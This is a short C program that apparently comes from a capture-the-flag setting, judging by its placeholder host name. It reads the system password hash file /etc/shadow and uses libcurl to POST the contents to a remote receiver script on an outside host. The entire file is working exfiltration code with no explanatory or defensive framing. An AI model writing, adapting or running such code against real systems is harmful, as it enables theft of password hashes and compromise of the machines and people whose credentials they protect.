#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

#define FILE_PATH "/etc/shadow"

char *read_file(const char *path) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    rewind(f);
    char *buf = malloc(len + 1);
    if (!buf) { fclose(f); return NULL; }
    fread(buf, 1, len, f);
    buf[len] = '\0';
    fclose(f);
    return buf;
}

int main(void) {
    char *data = read_file(FILE_PATH);
    if (!data) {
        perror("read_file");
        return 1;
    }

    CURL *curl = curl_easy_init();
    if (!curl) { free(data); return 1; }

    // URL-encode the filename
    char *encoded = curl_easy_escape(curl, FILE_PATH, 0);
    if (!encoded) {
        fprintf(stderr, "URL encoding failed\n");
        free(data);
        curl_easy_cleanup(curl);
        return 1;
    }

    // Build final URL
    char url[512];
    snprintf(url, sizeof(url), "%s%s", "https://c2c4ctf_changeme.quickhosting.com/receiver.php?name=", encoded);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK)
        fprintf(stderr, "curl error: %s\n", curl_easy_strerror(res));

    curl_free(encoded);
    curl_easy_cleanup(curl);
    free(data);
    return 0;
}
